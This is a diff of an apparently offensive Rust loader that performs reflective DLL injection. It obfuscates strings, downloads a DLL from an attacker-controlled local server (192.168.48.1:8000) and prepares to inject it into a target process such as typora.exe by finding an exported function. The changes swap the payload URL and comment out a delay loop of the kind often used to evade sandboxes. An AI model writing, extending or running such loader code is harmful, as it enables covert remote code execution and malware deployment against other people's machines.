@@ -49,7 +49,8 @@ fn main() {
 
     nt_api::init_nt_api().expect("[ERROR] Failed to initialize NT API!");
 
-    let obfused_url = obfuse!("http://192.168.48.1:8000/MCHELP.dll");
+    // let obfused_url = obfuse!("http://192.168.48.1:8000/MCHELP.dll");
+    let obfused_url = obfuse!("http://192.168.48.1:8000/ReflectiveDLL.dll");
     let url = obfused_url.as_str();
     // let obfused_process = obfuse!("notepad.exe");
     let obfused_process = obfuse!("typora.exe");
@@ -58,9 +59,9 @@ fn main() {
     let obfused_rflname = obfuse!("yolo");
     let rflname = obfused_rflname.as_str();
 
-    for _i in 1..=10 {
-        thread::sleep(Duration::from_secs(1));
-    }
+    // for _i in 1..=10 {
+    //     thread::sleep(Duration::from_secs(1));
+    // }
 
     println!("[INFO] Downloading from {}", url);
 
@@ -75,11 +76,12 @@ fn main() {
 
 
     // let dll = pe_parser::new(data);
-    let dll = parse_pe::PeParser::new(data);
+    let dll = parse_pe::PeFileParser::new(data);
 
     let func_raw = dll.get_func_raw(&rflname).expect("[ERROR] Failed to find yolo function");
     println!("[INFO] yolo raw offset: 0x{:X}", func_raw);
 
+    nt_api::init_nt_api().expect("[ERROR] Failed to initialize NT API!");
 
     // let dr0 = hwbp::DR::Dr0;
     // let dr1 = hwbp::DR::Dr1;
